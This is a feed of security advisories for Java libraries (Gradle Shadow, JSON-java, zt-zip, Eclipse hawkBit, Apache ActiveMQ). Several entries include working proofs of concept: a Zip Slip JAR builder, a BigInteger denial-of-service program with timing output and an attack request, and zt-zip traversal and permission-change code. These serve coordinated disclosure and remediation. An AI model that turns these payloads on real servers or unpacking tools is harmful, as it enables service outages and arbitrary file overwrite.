entry.title: [com.gradleup.shadow:com.gradleup.shadow.gradle.plugin] Gradle Shadow: Zip Slip path traversal in ShadowCopyAction — no independent entry-name sanitization
entry.content:
Summary

ShadowCopyAction in the Shadow plugin does not validate or sanitize ZIP entry names before writing them to the output fat JAR. A malicious upstream dependency containing path traversal sequences (e.g. ../../../../tmp/pwned.txt) in entry names will have those entries reproduced verbatim in the output shadow JAR.

Details

The vulnerability exists because Shadow relies entirely on Gradle's ZipFileTree for entry sanitization rather than implementing its own path validation. This means:

  1. Users on Gradle < 7.6.2 / 8.x < 8.2.0 are directly exploitable
  2. The produced shadow JAR becomes a Zip Slip weapon against any downstream consumer using unprotected extraction (raw ZipInputStream, older CI tooling, custom Java unpackers)
  3. If Shadow ever uses a non-ZipFileTree code path, protection disappears silently

Affected file: src/main/kotlin/com/github/jengelman/gradle/plugins/shadow/internal/ShadowCopyAction.kt

PoC

  1. Create a malicious JAR with path traversal entry:
import zipfile
with zipfile.ZipFile('evil.jar', 'w') as zf:
    zf.writestr('../../../../tmp/zipslip_proof.txt', 'pwned')
  1. Add as dependency in a shadow project
  2. Run gradle shadowJar
  3. Run unzip -l build/libs/*.jar | grep "\.\."
  4. Traversal entry survives in output JAR

Impact

Any tool extracting the shadow JAR with unprotected extraction is subject to arbitrary file overwrite. Users on older Gradle versions are directly vulnerable at build time.

References

  • https://github.com/GradleUp/shadow/security/advisories/GHSA-rr8v-fxxf-c986
  • https://nvd.nist.gov/vuln/detail/CVE-2026-75598
  • https://github.com/GradleUp/shadow/commit/0c2744fcc050e34a084f5131d5e167b13c342bfd
  • https://github.com/GradleUp/shadow/releases/tag/9.6.0
  • https://github.com/advisories/GHSA-rr8v-fxxf-c986

entry.title: [org.json:json] JSON-java: JSONTokener Has Unbounded Numeric String Resource-Exhaustion DoS
entry.content:
1. Executive Summary

JSON-java version 20260522 contains an unguarded path from an HTTP request body to unbounded BigInteger and BigDecimal construction. JSONTokener.nextSimpleValue() accumulates numeric characters into a StringBuilder with no length cap, then passes the full string to JSONObject.stringToNumber(), which calls new BigInteger(val) or new BigDecimal(val) directly. Both constructors have polynomial time complexity (O(n^1.585) for BigInteger).

A 488 KB JSON body — well within nginx's default 1 MB body-size limit — contains a 500,000-digit numeric literal that blocks the handling thread for approximately 3 seconds. Spring Boot has no default size limit for application/json request bodies. No parser configuration option (withStrictMode, withKeepStrings) prevents this. All three primary entry points are affected: new JSONObject(String), new JSONArray(String), and XML.toJSONObject(String).

This vulnerability is distinct from CVE-2023-5072 (which addressed StackOverflowError from deeply nested JSON structures via a try/catch in nextValue()) and from CVE-2022-45688 (which addressed recursive XML nesting depth). The numeric string length issue has been present since BigInteger support was introduced in release 20150729 and has never been fixed in any subsequent release.

Attack Complexity is rated High because successful exploitation requires the target application to be using org.json specifically (rather than the default Jackson library used by Spring Boot), and requires the developer to have explicitly passed user-controlled input to new JSONObject() or equivalent. These are deployment conditions beyond the attacker's control. See Section 6 for the full CVSS rationale and Section 8 for the comparison with Jackson's treatment of the same issue class.

This vulnerability was reproduced locally against json-20260522.jar with full evidence provided below.

2. Vulnerability Description

JSONTokener.nextSimpleValue() accumulates characters into a StringBuilder with no length limit until it hits a structural JSON character:

JSONTokener.java:500–504:

StringBuilder sb = new StringBuilder();
while (c >= ' ' && ",:]}/\\\"[{;=#".indexOf(c) < 0) {
    sb.append(c);     // unbounded — no length check
    c = this.next();
}

The accumulated string is passed to JSONObject.stringToValue() → stringToNumber(), which calls new BigInteger(val) with zero size guard:

JSONObject.java:2738:

BigInteger bi = new BigInteger(val);   // val can be arbitrarily large; no guard

BigInteger(String) has O(n^1.585) time complexity due to its internal Karatsuba multiplication during construction. A 100,000-digit input takes ~120 ms; a 1,000,000-digit input takes ~12 seconds. The decimal path (new BigDecimal(val), reached when the string contains a . or exponent) is equally affected.

No configuration option prevents this. withStrictMode(true) and withKeepStrings(true) are not checked in the nextSimpleValue() → stringToNumber() call chain. Confirmed by execution: both options still produce BigInteger in ~120 ms for a 100K-digit input.

Relationship to CVE-2023-5072: CVE-2023-5072 (fixed in release 20231013) catches StackOverflowError thrown by deeply nested JSON structures ({[ brackets) inside nextValue():

} catch (StackOverflowError e) {
    throw new JSONException("JSON Array or Object depth too large to process.", e);
}

This fix is in nextValue() and covers only recursive object/array structure depth. It has no effect on the numeric string length path in nextSimpleValue() → stringToNumber(). The BigInteger length issue was not addressed in 20231013 or in any subsequent release.

3. Affected Code Locations

File Lines Description
JSONTokener.java 500–504 nextSimpleValue() — unbounded character accumulation into StringBuilder, no length cap
JSONObject.java 2721–2748 stringToNumber() — new BigInteger(val) / new BigDecimal(val) called directly with no length guard

4. Proof of Concept (Locally Verified)

4.1 POC Code

import org.json.*;

public class Poc2NumericDoSv2 {
    public static void main(String[] args) {
        System.out.println("=== CVE-002: JSONTokener Unbounded Numeric String DoS ===");

        // Scaling: timing at different digit counts
        System.out.println("\n-- Unquoted numeric literal (JSONObject) --");
        int[] sizes = {10_000, 100_000, 200_000, 500_000, 1_000_000};
        for (int numLen : sizes) {
            String payload = "{\"x\":" + "9".repeat(numLen) + "}";
            long start = System.currentTimeMillis();
            JSONObject jo = new JSONObject(payload);
            long elapsed = System.currentTimeMillis() - start;
            System.out.printf("  %,7d digits (~%3d KB): %,5d ms  type=%s%n",
                numLen, payload.length()/1024, elapsed, jo.get("x").getClass().getSimpleName());
        }

        // All affected entry points
        System.out.println("\n-- All affected entry points (100K digits) --");
        String p = "9".repeat(100_000);
        long t;
        t = System.currentTimeMillis(); new JSONObject("{\"n\":" + p + "}");
        System.out.println("  new JSONObject(String):     " + (System.currentTimeMillis()-t) + " ms");
        t = System.currentTimeMillis(); new JSONArray("[" + p + "]");
        System.out.println("  new JSONArray(String):      " + (System.currentTimeMillis()-t) + " ms");
        t = System.currentTimeMillis(); XML.toJSONObject("<r>" + p + "</r>");
        System.out.println("  XML.toJSONObject(String):   " + (System.currentTimeMillis()-t) + " ms");

        // No configuration option prevents the DoS
        System.out.println("\n-- Configuration bypass attempts (100K digits) --");
        String payload100k = "{\"n\":" + p + "}";
        t = System.currentTimeMillis();
        new JSONObject(payload100k, new JSONParserConfiguration().withStrictMode(true));
        System.out.println("  withStrictMode(true):       " + (System.currentTimeMillis()-t) + " ms  [no protection]");
        t = System.currentTimeMillis();
        new JSONObject(payload100k, new JSONParserConfiguration().withKeepStrings(true));
        System.out.println("  withKeepStrings(true):      " + (System.currentTimeMillis()-t) + " ms  [no protection]");

        System.out.println("\nRESULT: [CONFIRMED VULNERABLE] No length guard exists in parsing chain.");
    }
}

4.2 Actual Execution Evidence (Reproduced Against json-20260522.jar)

=== CVE-002: JSONTokener Unbounded Numeric String DoS ===

-- Unquoted numeric literal (JSONObject) --
   10,000 digits (~  9 KB):    17 ms  type=BigInteger
  100,000 digits (~ 97 KB):   123 ms  type=BigInteger
  200,000 digits (~195 KB):   479 ms  type=BigInteger
  500,000 digits (~488 KB): 2,975 ms  type=BigInteger
  1,000,000 digits (~976 KB): 11,909 ms  type=BigInteger

-- All affected entry points (100K digits) --
  new JSONObject(String):     121 ms
  new JSONArray(String):      120 ms
  XML.toJSONObject(String):   123 ms

-- Configuration bypass attempts (100K digits) --
  withStrictMode(true):       121 ms  [no protection]
  withKeepStrings(true):      124 ms  [no protection]

RESULT: [CONFIRMED VULNERABLE] No length guard exists in parsing chain.

Key observations:

  • All three primary entry points (JSONObject, JSONArray, XML.toJSONObject) are equally affected
  • Neither withStrictMode(true) nor withKeepStrings(true) reduces the delay
  • A 488 KB payload produces a ~3 second thread blockage
  • Scaling is super-linear: doubling digits from 500K to 1M increases parse time approximately 4× (consistent with O(n^1.585))

5. Attack Scenarios

5.1 Thread-Pool Exhaustion via Concurrent Requests

A Java web application that explicitly uses org.json for request body parsing exposes a JSON endpoint. The developer parses the request body with new JSONObject(requestBody).

Single attack request:

POST /api/order HTTP/1.1
Host: target.example.com
Content-Type: application/json
Content-Length: 500011

{"amount":999...999}   (500,000 nines — ~488 KB body)

Effect: This single request occupies one Tomcat thread for ~3 seconds. To exhaust a default 200-thread Tomcat pool, the attacker sends 200 concurrent such requests — a total of ~95 MB of concurrent traffic (200 × 488 KB), achievable with any standard load-generation tool (ab, wrk, hey). While those threads are occupied, legitimate user requests queue and time out.

Why common defaults do not prevent this:

  • nginx default client_max_body_size = 1 MB → 488 KB payload passes through
  • Spring Boot has no default size limit for application/json @RequestBody (Tomcat's maxPostSize applies only to application/x-www-form-urlencoded and multipart/form-data, not to JSON)
  • No configuration option within org.json itself provides any protection

5.2 Amplification Ratio

The blocking time grows super-linearly with payload size, creating an asymmetric attack:

Payload size Thread blockage Ratio (ms per KB sent)
9 KB (10K digits) 17 ms 1.9 ms/KB
97 KB (100K digits) 123 ms 1.3 ms/KB
195 KB (200K digits) 479 ms 2.5 ms/KB
488 KB (500K digits) ~2,975 ms 6.1 ms/KB
976 KB (1M digits) ~11,909 ms 12.2 ms/KB

A 488 KB request — well within nginx's 1 MB default — ties up a server thread for 3 seconds. The ratio of CPU time consumed to bytes sent grows with payload size due to Karatsuba's super-linear complexity.

5.3 All Primary Entry Points Are Affected

The vulnerability is not limited to new JSONObject(String). Any org.json parsing call on the same numeric input produces the same delay:

new JSONObject(String):     121 ms  (for 100K digits)
new JSONArray(String):      120 ms  (for 100K digits)
XML.toJSONObject(String):   123 ms  (for 100K digits)

Any endpoint that parses user-controlled JSON or XML through org.json is a potential target, regardless of which specific API method is used.

7. Remediation

Primary fix — nextSimpleValue() in JSONTokener.java:

Add a numeric token length cap in the accumulation loop, configurable via JSONParserConfiguration. The guard must fire before the string is passed to stringToNumber():

// In JSONTokener.nextSimpleValue(), inside the while loop (line 501):
if (sb.length() > jsonParserConfiguration.getMaxNumberLength()) {
    throw this.syntaxError("Numeric literal exceeds maximum allowed length of "
        + jsonParserConfiguration.getMaxNumberLength());
}

Expose the limit in JSONParserConfiguration:

private int maxNumberLength = 1_000;  // matches Jackson's DEFAULT_MAX_NUM_LEN

public JSONParserConfiguration withMaxNumberLength(int maxNumberLength) {
    JSONParserConfiguration newConfig = this.clone();
    newConfig.maxNumberLength = maxNumberLength;
    return newConfig;
}
public int getMaxNumberLength() { return this.maxNumberLength; }

A safe default of 1,000 characters matches the StreamReadConstraints.DEFAULT_MAX_NUM_LEN value introduced in Jackson 2.15 (released April 2023) specifically to address this class of vulnerability. org.json has no equivalent protection as of version 20260522.

Defense-in-depth (application-level): Configure an upstream body size limit independent of any library fix. For nginx: client_max_body_size 64k;. For Spring Boot: register a CommonsRequestLoggingFilter or a OncePerRequestFilter that caps Content-Length before the body reaches the controller. These measures reduce the maximum achievable digit count but do not eliminate the root cause and should not be treated as a substitute for a library-level fix.

8. Comparison with Jackson's Treatment of the Same Issue

Jackson 2.15.0 (released April 2023) introduced StreamReadConstraints.withMaxNumberLength() with a default limit of 1,000 digits to address this exact class of vulnerability — and did so without a CVE being filed. This raises a legitimate question: if the Jackson ecosystem handled the same issue without a CVE, why does org.json warrant one?

The two situations are materially different in three ways:

1. Jackson's fix was universal and automatic; org.json's omission is not.

Jackson is the default JSON library in Spring Boot. When Jackson 2.15 shipped with DEFAULT_MAX_NUM_LEN = 1000, the protection was automatically applied to the entire Spring Boot ecosystem without any developer action. Every Spring Boot application upgrading to Spring Boot 3.1+ received the protection transparently.

org.json has no equivalent protection in any version through 20260522. Applications using org.json receive no protection from any upstream fix and have no configurable option to enable it. There is no automatic upgrade path.

2. org.json has an established CVE precedent for the same DoS class.

This project has already been assigned CVEs for resource-exhaustion vulnerabilities triggered by crafted parsing input:

  • CVE-2022-45688: XML recursive nesting DoS
  • CVE-2023-5072: JSON nested {[ structure DoS

Both were assigned under the same root pattern: parser accepts unbounded user-controlled input, resulting in resource exhaustion. The numeric string length issue is the same pattern in the same library, in a code path that the two prior fixes explicitly left unaddressed. Treating this as a non-CVE while the two structurally identical prior issues were assigned CVEs would be inconsistent.

3. RFC 8259 explicitly permits — and implicitly recommends — setting limits on number length.

RFC 8259 §6 states: "This specification allows implementations to set limits on the range and precision of numbers accepted." The RFC anticipates that secure implementations will impose such limits. org.json's NOTES.md acknowledges only "partial support" for BigInteger/BigDecimal, but provides no size guard and no documentation warning users of the DoS risk. The absence of a documented security boundary in the presence of an RFC-permitted and industry-standard protection mechanism constitutes an exploitable implementation deficiency.

9. Relationship to Prior CVEs

CVE Fixed In Root Cause Code Path Fix Applied
CVE-2022-45688 20230227 XML recursive nesting → StackOverflow in XML.parse() XML.java recursive parse() calls Added maxNestingDepth parameter (default 512) in ParserConfiguration
CVE-2023-5072 20231013 JSON nested {[ structures → StackOverflowError in nextValue() JSONTokener.nextValue() → recursive new JSONObject() / new JSONArray() Added catch (StackOverflowError e) in nextValue()
This report Unfixed Unbounded numeric string → O(n^1.585) BigInteger/BigDecimal construction nextSimpleValue() → stringToNumber() → new BigInteger(val) None

The three issues share the "resource exhaustion during parsing" symptom but have entirely separate root causes, code paths, and fixes. Neither prior CVE provides any protection against numeric string length attacks.

References

  • https://github.com/stleary/JSON-java/security/advisories/GHSA-ghc9-756g-vrcv
  • https://nvd.nist.gov/vuln/detail/CVE-2026-59171
  • https://github.com/stleary/JSON-java/pull/1065
  • https://github.com/stleary/JSON-java/pull/1067
  • https://github.com/stleary/JSON-java/commit/703ac34a55400f9c50889e3d0c778b6d7962e81c
  • https://github.com/stleary/JSON-java/commit/ab92bb9088a37f9e346cd1dda66f6a3c40a201e0
  • https://github.com/stleary/JSON-java/commit/fce83c91bb229dde472283dea648a9a8955237fd
  • https://github.com/stleary/JSON-java/releases/tag/20260719
  • https://github.com/advisories/GHSA-ghc9-756g-vrcv

entry.title: [org.zeroturnaround:zt-zip] zt-zip: ZipUtil.unpack can change file permissions of output directory
entry.content:
Summary

When using one of the ZipUtil.unpack overloads, the file permissions of the output directory can be changed. For example, when the output directory was only accessible to the 'owner' it could be instead made accessible to every OS user.

Details

When the name of a ZIP entry resolves to the output directory itself (e.g. the name /), the path traversal checks permit it and then perform actions on that directory, such as applying the file permissions of the ZIP entry to it.

PoC

This proof of concept requires an OS with support for POSIX file permissions. This issue itself is however not limited to those OS' with POSIX file permissions, see zt-zip's ZTFilePermissionsUtil.fetchDefaultStrategy which uses a fallback in that case.

// Uses Apache Commons Compress to create the malicious ZIP file
// The issue itself is however in how zt-zip processes that ZIP file
import org.apache.commons.compress.archivers.zip.AsiExtraField;
import org.apache.commons.compress.archivers.zip.ZipArchiveEntry;
import org.apache.commons.compress.archivers.zip.ZipArchiveOutputStream;
import org.apache.commons.compress.archivers.zip.ZipExtraField;

import org.zeroturnaround.zip.ZipUtil;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Set;

public class ZtZipTest {
    public static void main(String[] args) throws Exception {
        Path zipPath = Path.of("permissions-change.zip");

        Path outputDir = Path.of("permissions-change");
        Files.deleteIfExists(outputDir);
        Files.createDirectory(outputDir);
        Files.setPosixFilePermissions(outputDir, Set.of());

        // outputs "[]"
        System.out.println("Permissions before: " + Files.getPosixFilePermissions(outputDir));

        createZip(zipPath);

        ZipUtil.unpack(zipPath.toFile(), outputDir.toFile());

        // outputs "[..., OTHERS_EXECUTE, OTHERS_WRITE, OTHERS_READ, ...]"
        System.out.println("Permissions after: " + Files.getPosixFilePermissions(outputDir));
    }

    public static void createZip(Path path) throws Exception {
        try (ZipArchiveOutputStream zipStream = new ZipArchiveOutputStream(path)) {
            var entry = new ZipArchiveEntry("/");
            // Set 'allow all' permissions
            entry.setUnixMode(0b1_1111_1111);

            AsiExtraField extraField = new AsiExtraField();
            // Set 'allow all' permissions
            extraField.setMode(0b1_1111_1111);
            entry.setExtraFields(new ZipExtraField[] { extraField });
            zipStream.putArchiveEntry(entry);
            zipStream.closeArchiveEntry();
        }
    }
}

Impact

Affected are users who use ZipUtil.unpack to unpack an untrusted ZIP file.

References

  • https://github.com/zeroturnaround/zt-zip/security/advisories/GHSA-v2g6-7r9j-v6px
  • https://nvd.nist.gov/vuln/detail/CVE-2026-63499
  • https://github.com/zeroturnaround/zt-zip/pull/191
  • https://github.com/zeroturnaround/zt-zip/commit/1b625467b4c3cd3a9bee9efc35bdef2f8d9c8dad
  • https://github.com/zeroturnaround/zt-zip/releases/tag/v1.18.1
  • https://github.com/advisories/GHSA-v2g6-7r9j-v6px

entry.title: [org.zeroturnaround:zt-zip] zt-zip: Path traversal in fluent API unpack
entry.content:
Summary

ZipUtil.unpack(...) rejects ZIP entries that escape the target output directory, but the Zips fluent API appears to use a separate unpack implementation that does not apply the same destination-boundary check.

A ZIP entry such as:

../escape/poc.txt

is written outside the configured destination directory when processed with:

Zips.get(zip).unpack().destination(outputDir).process();

The transformer branch is affected as well.

Tested Version

commit: 067935dca375500d3ff025aafcdf0e4283931b1a

Root Cause

In src/main/java/org/zeroturnaround/zip/Zips.java, Zips.UnpackingCallback.process(...) builds the output file directly from the ZIP entry name:

String entryName = zipEntry.getName();
File file = new File(destination, entryName);

The method then creates directories/files and copies content to that path:

FileUtils.forceMkdir(file.getParentFile());
file.createNewFile();
FileUtils.copy(in, file);

When a transformer is configured, the same file is passed to transformIntoFile(...).

There does not appear to be a canonical path check before these filesystem writes, so ../ entries can resolve outside destination.

Minimal Reproduction

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.zip.*;

import org.zeroturnaround.zip.ZipUtil;
import org.zeroturnaround.zip.Zips;
import org.zeroturnaround.zip.transform.ZipEntryTransformer;

public class ZipsTraversalPoc {
  public static void main(String[] args) throws Exception {
    Path work = Files.createTempDirectory("ztzip-zips-poc");
    Path zip = work.resolve("poc.zip");
    Path escaped = work.resolve("escape").resolve("poc.txt");
    String entryName = "../escape/poc.txt";

    Files.createDirectories(escaped.getParent());

    try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zip))) {
      zos.putNextEntry(new ZipEntry(entryName));
      zos.write("plain branch\n".getBytes(StandardCharsets.UTF_8));
      zos.closeEntry();
    }

    Path zipUtilOut = work.resolve("ziputil-out");
    Files.createDirectories(zipUtilOut);
    try {
      ZipUtil.unpack(zip.toFile(), zipUtilOut.toFile());
      System.out.println("ZIPUTIL_REJECTED=false");
    }
    catch (Throwable t) {
      System.out.println("ZIPUTIL_REJECTED=" + t.getClass().getName());
    }
    System.out.println("ZIPUTIL_ESCAPED_EXISTS=" + Files.exists(escaped));

    Files.deleteIfExists(escaped);

    Path zipsOut = work.resolve("zips-out");
    Files.createDirectories(zipsOut);
    Zips.get(zip.toFile()).unpack().destination(zipsOut.toFile()).process();
    System.out.println("ZIPS_PLAIN_ESCAPED_EXISTS=" + Files.exists(escaped));
    System.out.println("ZIPS_PLAIN_ESCAPED_OUTSIDE_ROOT=" + !escaped.normalize().startsWith(zipsOut.normalize()));

    Files.deleteIfExists(escaped);

    Path zipsTransformOut = work.resolve("zips-transform-out");
    Files.createDirectories(zipsTransformOut);
    Zips.get(zip.toFile())
        .unpack()
        .destination(zipsTransformOut.toFile())
        .addTransformer(entryName, new ZipEntryTransformer() {
          public void transform(InputStream in, ZipEntry entry, ZipOutputStream out) throws IOException {
            out.putNextEntry(new ZipEntry(entry.getName()));
            out.write("transform branch\n".getBytes(StandardCharsets.UTF_8));
            out.closeEntry();
          }
        })
        .process();
    System.out.println("ZIPS_TRANSFORM_ESCAPED_EXISTS=" + Files.exists(escaped));
    System.out.println("ZIPS_TRANSFORM_ESCAPED_OUTSIDE_ROOT=" + !escaped.normalize().startsWith(zipsTransformOut.normalize()));
  }
}

Observed output:

ZIPUTIL_REJECTED=org.zeroturnaround.zip.MaliciousZipException
ZIPUTIL_ESCAPED_EXISTS=false
ZIPS_PLAIN_ESCAPED_EXISTS=true
ZIPS_PLAIN_ESCAPED_OUTSIDE_ROOT=true
ZIPS_TRANSFORM_ESCAPED_EXISTS=true
ZIPS_TRANSFORM_ESCAPED_OUTSIDE_ROOT=true

Expected Behavior

Zips.get(zip).unpack().destination(outputDir).process() should reject traversal entries or otherwise ensure that the resolved output path remains inside outputDir.

Impact

Applications that unpack attacker-controlled ZIP files through the Zips fluent API may allow arbitrary file writes outside the intended extraction directory, depending on filesystem permissions and application layout.

Suggested Fix

Apply the same destination-boundary validation used by ZipUtil.unpack(...) before any filesystem write in Zips.UnpackingCallback.process(...).

For example, compare canonical Path values before creating directories or files:

file.getCanonicalFile().toPath()
    .startsWith(destination.getCanonicalFile().toPath())

Regression tests should cover both:

Zips.get(zip).unpack().destination(out).process();
Zips.get(zip).unpack().destination(out).addTransformer(...).process();
### References

- <https://github.com/zeroturnaround/zt-zip/security/advisories/GHSA-52c6-99qm-3hqr>
- <https://nvd.nist.gov/vuln/detail/CVE-2026-63436>
- <https://github.com/zeroturnaround/zt-zip/pull/180>
- <https://github.com/zeroturnaround/zt-zip/commit/59a76ad576b0fcd50ea018e3608afb946c1492fd>
- <https://github.com/zeroturnaround/zt-zip/releases/tag/v1.18.0>
- <https://github.com/advisories/GHSA-52c6-99qm-3hqr>

entry.title: [org.eclipse.hawkbit:hawkbit-ddi-resource] Eclipse hawkBit DDI has Privilege Escalation that allows Tenant-Isolated Firmware Exfiltration
entry.content:
Description

A privilege escalation vulnerability has been identified in the Direct Device Integration (DDI) Controller of Eclipse hawkBit (versions 1.0.3 and prior).

This vulnerability allows an authenticated device to escalate its permissions and bypass the strict boundaries of its assigned updates. Under normal operation, a device should be restricted strictly to the specific firmware artifacts explicitly assigned to it. However, this flaw enables any authenticated device to bypass this restriction and download any firmware artifact within the same tenant.

This is not an authentication bypass; the requesting device must possess valid credentials for its respective tenant. Instead, the issue stems from a flaw in object-level authorization validation.

A related, lower-severity helper issue exists in the listing software modules artifacts metadata endpoint. This endpoint does not enforce assignment checks, enabling an authenticated device to list and enumerate available firmware artifacts, which can facilitate targeted exfiltration using the main download authorization bypass.

Impact

  • Severity: Moderate
  • Scope: Tenant-isolated. An attacker must be an authenticated device within the target tenant to exploit this vulnerability.
  • Confidentiality Impact: Low. While firmware binaries can be retrieved, the impact is mitigated because access is restricted strictly to the scope of the pre-authenticated tenant, and no administrative or cross-tenant data is exposed. Additionally, production firmware binaries are by design not expected to contain highly sensitive or confidential data (such as hardcoded credentials or private keys), further supporting the Low confidentiality rating.

Affected Products and Versions

  • Product: eclipse-hawkbit/hawkbit
  • Affected Component: hawkbit-ddi/hawkbit-ddi-resource, as well as the compiled binaries and Docker images that contain this component.
  • Affected Versions: 1.0.3 and prior versions.
  • Patched Version: 1.0.4

Remediation

Upgrade to version 1.0.4 or later.

Fix details: The download authorization logic has been corrected to ensure that assignment-based verification is executed on every artifact download request. Additionally, the software module metadata endpoint has been updated to enforce proper authorization, restricting access exclusively to software modules and artifacts that are explicitly assigned to or already installed on the requesting device.

Credits

Eclipse would like to thank Santosh Kumar Puppala (GitHub: Santoshkumarpuppala, Email: santhoshkumar7794@gmail.com) for discovering and reporting this vulnerability through coordinated disclosure.

entry.title: [org.eclipse.hawkbit:hawkbit-ddi-resource] Duplicate Advisory: Privilege Escalation in Eclipse hawkBit DDI allows Tenant-Isolated Firmware Exfiltration
entry.content:
Duplicate Advisory

This advisory has been withdrawn because it is a duplicate of GHSA-92r3-p8c2-3fpx. This link is maintained to preserve external references.

Original Description

In Eclipse hawkBit versions 1.0.3 and prior, a privilege escalation vulnerability (CWE-284 / CWE-862) has been identified in the Direct Device Integration (DDI) Controller.

This vulnerability allows an authenticated device to escalate its permissions and bypass the strict boundaries of its assigned updates. Under normal operation, a device should be restricted strictly to the specific firmware artifacts explicitly assigned to it. However, this flaw enables any authenticated device to bypass this restriction and download any firmware artifact within the same tenant.

This is not an authentication bypass; the requesting device must possess valid credentials for its respective tenant. Instead, the issue stems from a flaw in object-level authorization validation.

A related, lower-severity helper issue exists in the listing software modules artifacts metadata endpoint. This endpoint does not enforce assignment checks, enabling an authenticated device to list and enumerate available firmware artifacts, which can facilitate targeted exfiltration using the main download authorization bypass.

entry.title: [org.apache.activemq:apache-activemq] Apache ActiveMQ Broker, Apache ActiveMQ All, Apache ActiveMQ have a Missing Authorization vulnerability
entry.content:
Missing Authorization vulnerability in Apache ActiveMQ Broker, Apache ActiveMQ All, Apache ActiveMQ.

Apache ActiveMQ Classic temporary destinations are expected to be isolated to the connection that created them. The isolation can be broken as this is only checked in the client, allowing a different connection to consume from another connection's temporary destination. This issue affects Apache ActiveMQ Broker: before 5.19.8, from 6.0.0 before 6.2.7; Apache ActiveMQ All: before 5.19.8, from 6.0.0 before 6.2.7; Apache ActiveMQ: before 5.19.8, from 6.0.0 before 6.2.7.

Users are recommended to upgrade to version 6.2.7, which fixes the issue.

entry.title: [org.apache.activemq:activemq-web-console] Apache ActiveMQ, Apache ActiveMQ Web Console vulnerable to Cross-site Scripting
entry.content:
Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Apache ActiveMQ, Apache ActiveMQ Web Console.

The browse page in the web console renders a message Id directly without sanitization. This allows an authenticated producer to send a message with a JMS message ID that has been crafted to contain HTML/JavaScript such that when an administrator browses the queue in the Web Console, the payload executes in their browser. This issue affects Apache ActiveMQ: before 5.19.8, from 6.0.0 before 6.2.7; Apache ActiveMQ Web Console: before 5.19.8, from 6.0.0 before 6.2.7.

Users are recommended to upgrade to version 6.2.7 or 5.19.8, which fixes the issue.

entry.title: [org.apache.activemq:activemq-stomp] Apache ActiveMQ, Apache ActiveMQ All, Apache ActiveMQ Stomp has an Improper Input Validation vulnerability
entry.content:
Improper Input Validation vulnerability in Apache ActiveMQ, Apache ActiveMQ All, Apache ActiveMQ Stomp.

A remote unauthenticated peer that can reach an exposed STOMP connector can trigger denial-of-service behavior by sending a negative content-length. For the NIO STOMP transport, an attacker can keep streaming body bytes and grow the per-connection command buffer beyond configured limits to cause OOM. For the blocking STOMP protocol, an error will instead force abnormal transport exception handling for the affected connection and closure. This issue affects Apache ActiveMQ: before 5.19.8, from 6.0.0 before 6.2.7; Apache ActiveMQ All: before 5.19.8, from 6.0.0 before 6.2.7; Apache ActiveMQ Stomp: before 5.19.8, from 6.0.0 before 6.2.7.

Users are recommended to upgrade to version 6.2.7 or 5.19.8, which fixes the issue.
